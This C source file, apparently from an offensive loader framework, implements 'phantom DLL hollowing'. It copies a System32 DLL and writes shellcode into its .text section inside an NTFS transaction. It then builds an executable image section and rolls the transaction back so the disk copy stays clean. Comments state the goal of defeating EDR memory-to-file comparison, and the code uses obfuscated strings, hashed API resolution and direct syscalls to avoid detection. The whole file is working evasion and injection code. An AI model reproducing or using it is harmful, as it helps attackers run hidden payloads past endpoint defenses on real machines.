// =============================================
// Phantom.c - Phantom DLL Hollowing (NTFS Transactions)
// =============================================
//
// Creates a transacted copy of a sacrificial DLL,
// overwrites the .text section with shellcode in
// the transaction, creates an image section from
// the modified file, then rolls back the transaction.
//
// The section retains the modified content but the
// on-disk file is unchanged. EDR that compares
// memory to the backing file sees no mismatch
// because the section's FILE_OBJECT has the
// transacted (modified) data.
//
// Requires write access to the DLL file path.
// Falls back gracefully if permissions are insufficient.
// =============================================

#include "Common.h"

// -----------------------------------------------
// Scan System32 for a DLL suitable for hollowing:
//   - Not already loaded in this process
//   - Has an executable section >= dwMinSize
// Returns TRUE and fills pOutName with the filename.
// -----------------------------------------------
static BOOL FindSuitableDll(
    IN  PAPI_HASHING      pApi,
    IN  HMODULE           hK32,
    IN  fnCloseHandle2    pCloseHandle,
    IN  fnReadFile        pReadFile,
    IN  LPCSTR            szPrefix,
    IN  SIZE_T            nPre,
    IN  DWORD             dwMinSize,
    OUT PCHAR             pOutName
) {
    BYTE xFindFirst[] = XSTR_FIND_FIRST_FILE_A;
    DEOBF(xFindFirst);
    fnFindFirstFileA2 pFindFirst = (fnFindFirstFileA2)pApi->pGetProcAddress(hK32, (LPCSTR)xFindFirst);

    BYTE xFindNext[] = XSTR_FIND_NEXT_FILE_A;
    DEOBF(xFindNext);
    fnFindNextFileA2 pFindNext = (fnFindNextFileA2)pApi->pGetProcAddress(hK32, (LPCSTR)xFindNext);

    BYTE xFindClose[] = XSTR_FIND_CLOSE;
    DEOBF(xFindClose);
    fnFindClose2 pFindCloseFunc = (fnFindClose2)pApi->pGetProcAddress(hK32, (LPCSTR)xFindClose);

    BYTE xCreateFile[] = XSTR_CREATE_FILE_A;
    DEOBF(xCreateFile);
    fnCreateFileA2 pCreateFile = (fnCreateFileA2)pApi->pGetProcAddress(hK32, (LPCSTR)xCreateFile);

    if (!pFindFirst || !pFindNext || !pFindCloseFunc || !pCreateFile)
        return FALSE;

    // Build search pattern: C:\Windows\System32\*.dll
    BYTE xWild[] = XSTR_DLL_WILDCARD;
    DEOBF(xWild);

    CHAR szPattern[260];
    MemSet(szPattern, 0, sizeof(szPattern));
    MemCopy(szPattern, szPrefix, nPre);
    MemCopy(szPattern + nPre, xWild, StrLenA((LPCSTR)xWild));

    WIN32_FIND_DATAA fd;
    MemSet(&fd, 0, sizeof(fd));
    HANDLE hFind = pFindFirst(szPattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE)
        return FALSE;

    BOOL bFound = FALSE;

    do {
        // Skip if already loaded
        if (pApi->pGetModuleHandleA(fd.cFileName) != NULL)
            continue;

        // Build full path
        CHAR szFull[260];
        MemSet(szFull, 0, sizeof(szFull));
        SIZE_T nName = StrLenA(fd.cFileName);
        MemCopy(szFull, szPrefix, nPre);
        MemCopy(szFull + nPre, fd.cFileName, nName);

        // Open and check PE headers
        HANDLE hPe = pCreateFile(szFull, GENERIC_READ, FILE_SHARE_READ,
                                 NULL, OPEN_EXISTING, 0, NULL);
        if (hPe == INVALID_HANDLE_VALUE)
            continue;

        BYTE peHdr[1024];
        DWORD dwRead = 0;
        BOOL bOk = pReadFile(hPe, peHdr, sizeof(peHdr), &dwRead, NULL);
        pCloseHandle(hPe);

        if (!bOk) continue;

        PIMAGE_NT_HEADERS pNt = NULL;
        if (!ValidatePeHeadersBounded(peHdr, dwRead, &pNt))
            continue;

        PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
        for (WORD s = 0; s < pNt->FileHeader.NumberOfSections; s++) {
            if ((pSec[s].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                pSec[s].SizeOfRawData >= dwMinSize) {
                MemCopy(pOutName, fd.cFileName, nName + 1);
                bFound = TRUE;
                break;
            }
        }
        if (bFound) break;
    } while (pFindNext(hFind, &fd));

    pFindCloseFunc(hFind);
    return bFound;
}

// -----------------------------------------------
// Phantom DLL Hollowing entry point.
// Uses a goto-cleanup pattern: hTx / hFile / hSection
// are sentinel-initialized; each is reset after early
// in-flow close so the cleanup label only fires on
// genuinely open handles.
// -----------------------------------------------
BOOL PhantomDllHollow(
    IN  PAPI_HASHING pApi,
    IN  PNTAPI_FUNC  pNtApis,
    IN  PBYTE        pShellcode,
    IN  DWORD        dwShellcodeSize,
    OUT PVOID*       ppExecAddr
) {
    BOOL     bSuccess = FALSE;
    HANDLE   hTx      = INVALID_HANDLE_VALUE;
    HANDLE   hFile    = INVALID_HANDLE_VALUE;
    HANDLE   hSection = NULL;
    NTSTATUS STATUS   = 0;

    // pRollback resolved later; need a sentinel for cleanup label
    fnRollbackTransaction pRollback = NULL;
    // pCloseHandle resolved later; cleanup needs it too
    fnCloseHandle2        pCloseHandle = NULL;

    if (!pApi || !pNtApis || !pShellcode || !ppExecAddr || dwShellcodeSize == 0)
        goto cleanup;

    // --- Resolve kernel32 base ---

    BYTE xK32[] = XSTR_KERNEL32_DLL;
    DEOBF(xK32);
    HMODULE hK32 = pApi->pGetModuleHandleA((LPCSTR)xK32);
    if (!hK32)
        goto cleanup;

    // --- Resolve all needed APIs ---

    fnReadFile pReadFile = (fnReadFile)FetchExportAddress((PVOID)hK32, ReadFile_JOAAT);
    fnWriteFile2 pWriteFile = (fnWriteFile2)FetchExportAddress((PVOID)hK32, WriteFile_JOAAT);
    fnSetFilePointer pSetFilePointer = (fnSetFilePointer)FetchExportAddress((PVOID)hK32, SetFilePointer_JOAAT);
    pCloseHandle = (fnCloseHandle2)FetchExportAddress((PVOID)hK32, CloseHandle_JOAAT);
    if (!pReadFile || !pWriteFile || !pSetFilePointer || !pCloseHandle)
        goto cleanup;

    BYTE xCreateFileTx[] = XSTR_CREATE_FILE_TXA;
    DEOBF(xCreateFileTx);
    fnCreateFileTransactedA pCreateFileTx =
        (fnCreateFileTransactedA)pApi->pGetProcAddress(hK32, (LPCSTR)xCreateFileTx);

    BYTE xGetTemp[] = XSTR_GET_TEMP_PATH_A;
    DEOBF(xGetTemp);
    fnGetTempPathA2 pGetTempPath = (fnGetTempPathA2)pApi->pGetProcAddress(hK32, (LPCSTR)xGetTemp);

    BYTE xCopyFile[] = XSTR_COPY_FILE_A;
    DEOBF(xCopyFile);
    fnCopyFileA2 pCopyFile = (fnCopyFileA2)pApi->pGetProcAddress(hK32, (LPCSTR)xCopyFile);

    if (!pCreateFileTx || !pGetTempPath || !pCopyFile)
        goto cleanup;

    // --- Scan System32 for suitable DLL ---

    BYTE xPrefix[] = XSTR_SYS32_PREFIX;
    DEOBF(xPrefix);
    SIZE_T nPre = StrLenA((LPCSTR)xPrefix);

    CHAR szChosenDll[260];
    MemSet(szChosenDll, 0, sizeof(szChosenDll));

    if (!FindSuitableDll(pApi, hK32, pCloseHandle, pReadFile,
                         (LPCSTR)xPrefix, nPre, dwShellcodeSize, szChosenDll)) {
        LOG("[!] Phantom: no suitable DLL found in System32");
        goto cleanup;
    }
    LOG("[+] Phantom: selected DLL for hollowing");

    // --- Copy chosen DLL to temp ---

    CHAR szSrcPath[260];
    MemSet(szSrcPath, 0, sizeof(szSrcPath));
    SIZE_T nDll = StrLenA(szChosenDll);
    MemCopy(szSrcPath, xPrefix, nPre);
    MemCopy(szSrcPath + nPre, szChosenDll, nDll);

    CHAR szPath[260];
    MemSet(szPath, 0, sizeof(szPath));
    DWORD dwTempLen = pGetTempPath(sizeof(szPath), szPath);
    if (dwTempLen == 0)
        goto cleanup;
    MemCopy(szPath + dwTempLen, szChosenDll, nDll);

    if (!pCopyFile(szSrcPath, szPath, FALSE)) {
        LOG("[!] Phantom: CopyFile to temp failed");
        goto cleanup;
    }
    LOG("[+] Phantom: DLL copied to temp");

    // --- Load ktmw32.dll and resolve TxF APIs ---

    BYTE xKtm[] = XSTR_KTMW32_DLL;
    DEOBF(xKtm);
    HMODULE hKtm = pApi->pLoadLibraryA((LPCSTR)xKtm);
    if (!hKtm)
        goto cleanup;

    BYTE xCreateTx[] = XSTR_CREATE_TRANSACTION;
    DEOBF(xCreateTx);
    fnCreateTransaction pCreateTx =
        (fnCreateTransaction)pApi->pGetProcAddress(hKtm, (LPCSTR)xCreateTx);
    if (!pCreateTx)
        goto cleanup;

    BYTE xRollback[] = XSTR_ROLLBACK_TRANSACTION;
    DEOBF(xRollback);
    pRollback = (fnRollbackTransaction)pApi->pGetProcAddress(hKtm, (LPCSTR)xRollback);
    if (!pRollback)
        goto cleanup;

    // --- Create transaction ---

    hTx = pCreateTx(NULL, NULL, 0, 0, 0, 0, NULL);
    if (hTx == INVALID_HANDLE_VALUE) {
        LOG("[!] Phantom: CreateTransaction failed");
        goto cleanup;
    }

    // --- Open DLL file within the transaction (read + write) ---

    hFile = pCreateFileTx(
        szPath,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTx,
        NULL,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        LOG("[!] Phantom: CreateFileTransacted failed (permissions?)");
        goto cleanup;
    }

    LOG("[+] Phantom: transacted file opened");

    // --- Read PE headers from the transacted file ---
    // We need to find the .text section's PointerToRawData and VirtualAddress

    BYTE peHeader[1024];
    DWORD dwBytesRead = 0;
    if (!pReadFile(hFile, peHeader, sizeof(peHeader), &dwBytesRead, NULL))
        goto cleanup;

    PIMAGE_NT_HEADERS pNt = NULL;
    if (!ValidatePeHeadersBounded(peHeader, dwBytesRead, &pNt))
        goto cleanup;

    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    DWORD dwTextRawOffset = 0;
    DWORD dwTextRawSize   = 0;
    DWORD dwTextVA        = 0;

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            dwTextRawOffset = pSec[i].PointerToRawData;
            dwTextRawSize   = pSec[i].SizeOfRawData;
            dwTextVA        = pSec[i].VirtualAddress;
            break;
        }
    }

    if (dwTextRawSize < dwShellcodeSize) {
        LOG("[!] Phantom: .text too small for shellcode");
        goto cleanup;
    }

    // --- Seek to .text section's raw data offset ---

    pSetFilePointer(hFile, (LONG)dwTextRawOffset, NULL, 0 /*FILE_BEGIN*/);

    // --- Write shellcode at .text offset in transacted file ---

    DWORD dwWritten = 0;
    if (!pWriteFile(hFile, pShellcode, dwShellcodeSize, &dwWritten, NULL) || dwWritten != dwShellcodeSize) {
        LOG("[!] Phantom: WriteFile failed");
        goto cleanup;
    }

    LOG("[+] Phantom: shellcode written to transacted .text");

    // --- Create image section from the transacted file ---
    // The section sees the modified content (with our shellcode)

    SET_SYSCALL(pNtApis->NtCreateSection);
    STATUS = RunSyscall(
        (ULONG_PTR)&hSection,
        (ULONG_PTR)0x000F001F,     // SECTION_ALL_ACCESS
        (ULONG_PTR)0,              // NULL ObjectAttributes
        (ULONG_PTR)0,              // NULL MaximumSize (file-backed)
        (ULONG_PTR)PAGE_READONLY,
        (ULONG_PTR)0x01000000,     // SEC_IMAGE
        (ULONG_PTR)hFile,
        0, 0, 0, 0, 0
    );
    if (!NT_SUCCESS(STATUS)) {
        LOG_STATUS("[!] Phantom: NtCreateSection failed", STATUS);
        goto cleanup;
    }

    // --- Close file handle (section holds its own reference) ---
    pCloseHandle(hFile);
    hFile = INVALID_HANDLE_VALUE;

    // --- Rollback transaction: on-disk file is unchanged ---
    // The section retains the modified content
    pRollback(hTx);
    pCloseHandle(hTx);
    hTx = INVALID_HANDLE_VALUE;
    LOG("[+] Phantom: transaction rolled back (file clean)");

    // --- Map the section into our process ---

    PVOID  pBase    = NULL;
    SIZE_T viewSize = 0;
    SET_SYSCALL(pNtApis->NtMapViewOfSection);
    STATUS = RunSyscall(
        (ULONG_PTR)hSection,
        (ULONG_PTR)(HANDLE)-1,     // Current process
        (ULONG_PTR)&pBase,
        (ULONG_PTR)0,              // ZeroBits
        (ULONG_PTR)0,              // CommitSize
        (ULONG_PTR)0,              // SectionOffset = NULL
        (ULONG_PTR)&viewSize,
        (ULONG_PTR)1,              // ViewShare
        (ULONG_PTR)0,              // AllocationType
        (ULONG_PTR)PAGE_READONLY,
        0, 0
    );
    if (!NT_SUCCESS(STATUS)) {
        LOG_STATUS("[!] Phantom: NtMapViewOfSection failed", STATUS);
        goto cleanup;
    }

    // Section handle no longer needed after mapping
    pCloseHandle(hSection);
    hSection = NULL;

    // --- Change .text protection to executable ---
    // SEC_IMAGE maps with PE section header protections (typically RX).
    // SHELLCODE_EXEC_PROT selects RX or RWX based on build config.

    PVOID  pTextAddr  = (PVOID)((PBYTE)pBase + dwTextVA);
    SIZE_T sProtSize  = (SIZE_T)dwShellcodeSize;
    ULONG  dwOldProt  = 0;

    SET_SYSCALL(pNtApis->NtProtectVirtualMemory);
    STATUS = RunSyscall(
        (ULONG_PTR)(HANDLE)-1,
        (ULONG_PTR)&pTextAddr,
        (ULONG_PTR)&sProtSize,
        (ULONG_PTR)SHELLCODE_EXEC_PROT,
        (ULONG_PTR)&dwOldProt,
        0, 0, 0, 0, 0, 0, 0
    );
    if (!NT_SUCCESS(STATUS)) {
        LOG_STATUS("[!] Phantom: NtProtectVirtualMemory failed", STATUS);
        goto cleanup;
    }

    *ppExecAddr = (PVOID)((PBYTE)pBase + dwTextVA);
    LOG("[+] Phantom DLL hollowing: shellcode mapped via transacted section");
    bSuccess = TRUE;

cleanup:
    if (hFile != INVALID_HANDLE_VALUE && pCloseHandle)
        pCloseHandle(hFile);
    if (hTx != INVALID_HANDLE_VALUE && pCloseHandle) {
        if (pRollback) pRollback(hTx);
        pCloseHandle(hTx);
    }
    if (hSection != NULL && pCloseHandle)
        pCloseHandle(hSection);
    return bSuccess;
}
